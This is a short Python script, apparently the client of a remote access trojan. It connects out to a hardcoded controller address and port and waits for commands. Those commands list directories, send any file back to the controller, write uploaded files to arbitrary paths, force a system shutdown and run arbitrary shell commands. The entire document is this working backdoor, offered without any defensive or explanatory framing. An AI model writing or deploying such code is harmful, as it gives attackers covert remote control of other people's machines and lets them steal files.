import os
import socket

s = socket.socket()
port = 8080
host = "192.168.50.100"
s.connect((host, port))


while True:
    command = s.recv(1024)
    command = command.decode()
    if command == "view_cwd":
        files = os.getcwd()
        files = str(files)
        s.send(files.encode())
    elif command == "custom_dir":
        filepath = s.recv(1024).decode()
        files = str(os.listdir(filepath))
        s.send(files.encode())
    elif command == "download_file":
        file_path = s.recv(5000)
        file_path = file_path.decode()
        file = open(file_path, "rb")
        data = file.read()
        s.send(data)
    elif command == "upload_file":
        file = s.recv(100000)
        filepath = s.recv(5000)
        new_file = open(filepath, "wb")
        new_file.write(file)
        new_file.close()
    elif command == "shutdown":
        sec = s.recv(5000)
        sec = sec.decode()
        command = "shutdown /s /f /t " + sec
        os.system(command)
    elif command == "custom_command":
        cmd = s.recv(5000)
        cmd = cmd.decode()
        output = str(os.system(cmd))
        s.send(output.encode())
    elif command == "kill":
        break